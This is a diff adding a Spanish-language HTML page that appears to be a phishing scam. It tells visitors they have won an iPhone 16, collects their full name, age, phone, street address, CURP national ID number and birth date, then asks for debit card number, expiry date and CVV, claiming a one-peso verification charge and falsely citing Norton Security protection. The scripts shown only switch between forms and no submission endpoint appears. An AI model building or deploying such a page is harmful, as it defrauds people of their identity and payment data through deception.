@@ -1,0 +1,261 @@
+<!doctype html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HAZ GANADO UN IPHONE, CONTESTA LA ENCUENSTA PARA SEGUIR</title>
+    <link rel="stylesheet" href="styles.css">
+<style type="text/css" id="dcoder_stylesheet">/* Reset básico */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background-color: #f5f5f7;
+    color: #1d1d1f;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+}
+
+.container {
+    background-color: #ffffff;
+    padding: 30px;
+    border-radius: 12px;
+    box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+    width: 100%;
+    max-width: 400px;
+    transition: all 0.3s ease;
+}
+
+h2 {
+    text-align: center;
+    font-weight: 600;
+    margin-bottom: 20px;
+    color: #1d1d1f;
+}
+
+form label {
+    display: block;
+    margin-bottom: 8px;
+    font-size: 14px;
+    font-weight: 500;
+    color: #6e6e73;
+}
+
+form input, form select {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 20px;
+    border: 1px solid #d2d2d7;
+    border-radius: 8px;
+    font-size: 16px;
+    color: #1d1d1f;
+    transition: border-color 0.3s ease;
+}
+
+form input:focus, form select:focus {
+    border-color: #0071e3;
+    outline: none;
+}
+
+button {
+    width: 100%;
+    padding: 12px;
+    background-color: #0071e3;
+    border: none;
+    border-radius: 12px;
+    color: white;
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+}
+
+button:hover {
+    background-color: #005bb5;
+}
+
+/* Estilos del Modal */
+.modal {
+    display: none;
+    position: fixed;
+    z-index: 10;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5);
+}
+
+.modal-content {
+    background-color: #ffffff;
+    margin: 10% auto;
+    padding: 30px;
+    border-radius: 12px;
+    width: 100%;
+    max-width: 400px;
+    text-align: center;
+    box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+    animation: fadeIn 0.3s ease;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; transform: scale(0.95); }
+    to { opacity: 1; transform: scale(1); }
+}
+
+.modal h2 {
+    font-size: 20px;
+    font-weight: 600;
+    margin-bottom: 15px;
+    color: #1d1d1f;
+}
+
+.modal p {
+    font-size: 15px;
+    color: #6e6e73;
+    margin-bottom: 20px;
+}
+
+.modal button {
+    background-color: #0071e3;
+    padding: 12px 20px;
+    border-radius: 8px;
+    color: white;
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+}
+
+.modal button:hover {
+    background-color: #005bb5;
+}
+
+.close {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    font-size: 20px;
+    color: #6e6e73;
+    cursor: pointer;
+}
+
+/* Formulario de Tarjeta de Débito */
+#cardForm {
+    display: none;
+    background-color: #ffffff;
+    padding: 30px;
+    border-radius: 12px;
+    box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+    width: 100%;
+    max-width: 400px;
+    margin-top: 20px;
+}
+
+#cardForm label {
+    color: #6e6e73;
+    font-weight: 500;
+}
+
+#cardForm input {
+    border: 1px solid #d2d2d7;
+    font-size: 16px;
+    color: #1d1d1f;
+}
+
+#cardForm button {
+    background-color: #0071e3;
+    border-radius: 12px;
+}
+
+#cardForm button:hover {
+    background-color: #005bb5;
+}</style></head>
+<body>
+    <div class="container">
+        <h2>Usted es elegible para ganar un Iphone 16</h2>
+        <form id="mainForm">
+            <label for="name">Nombre Completo:</label>
+            <input type="text" id="name" name="name" placeholder="Ingresa tu nombre" required>
+
+            <label for="age">Edad:</label>
+            <input type="number" id="age" name="age" placeholder="Ingresa tu edad" min="1" max="100" required>
+
+            <label for="phone">Número de Teléfono:</label>
+            <input type="tel" id="phone" name="phone" placeholder="Ej: +1234567890" pattern="^\+?[0-9]{10,15}$" required>
+
+            <label for="state">Estado:</label>
+            <select id="state" name="state" required>
+                <option value="">Selecciona tu estado</option>
+                <option value="Aguascalientes">Colima</option>
+                <option value="Oaxaca">Nueva York(Oaxaca)</option>
+                <!-- Agrega más estados según sea necesario -->
+            </select>
+
+            <label for="street">Calle:</label>
+            <input type="text" id="street" name="street" placeholder="Ingresa tu calle" required>
+
+            <label for="houseNumber">Número de Casa:</label>
+            <input type="number" id="houseNumber" name="houseNumber" placeholder="Número de casa" min="1" required>
+
+            <label for="colony">Colonia:</label>
+            <input type="text" id="colony" name="colony" placeholder="Ingresa tu colonia" required>
+
+            <label for="curp">CURP:</label>
+            <input type="text" id="curp" name="curp" placeholder="Ingresa tu CURP" pattern="^[A-Z]{4}\d{6}[HM][A-Z]{5}\d{2}$" required>
+
+            <label for="birthDate">Fecha de Nacimiento:</label>
+            <input type="date" id="birthDate" name="birthDate" required>
+
+            <button type="button" onclick="showModal()">Enviar</button>
+        </form>
+    </div>
+
+    <!-- Modal -->
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">×</span>
+            <h2>Eres elegible a ganar un iPhone 16 gratis</h2>
+            <p>Recibe tu Iphone 16 abajo.</p>
+            <button onclick="showCardForm()"></button>
+        </div>
+    </div>
+
+    <!-- Formulario de Tarjeta de Débito -->
+    <div id="cardForm" class="container" style="display: none;">
+        <h2>Ingresa los Datos. Se le realizara un cargo de un MXN para verificar su identidad</h2>
+        <form>
+            <label for="cardNumber">Número de Tarjeta:</label>
+            <input type="text" id="cardNumber" name="cardNumber" placeholder="XXXX-XXXX-XXXX-XXXX" pattern="\d{4}-\d{4}-\d{4}-\d{4}" required>
+
+            <label for="expiryDate">Fecha de Expiración:</label>
+            <input type="text" id="expiryDate" name="expiryDate" placeholder="Month/Year" pattern="\d{2}/\d{2}" required>
+
+            <label for="cvv">CVV:</label>
+            <input type="text" id="cvv" name="cvv" placeholder="CVV" pattern="\d{3}" required>
+        <h2>Pago protegido con tecnologia de Norton Security</h2>
+            <button type="submit">Enviar</button>
+        </form>
+    </div>
+
+    <script src="script.js"></script>
+
+<script type="text/javascript" id="dcoder_script">function showModal() {
+    document.getElementById("modal").style.display = "block";
+}
+
+function closeModal() {
+    document.getElementById("modal").style.display = "none";
+}
+
+function showCardForm() {
+    closeModal();
+    document.getElementById("mainForm").style.display = "none";
+    document.getElementById("cardForm").style.display = "block";
+}</script></body></html>
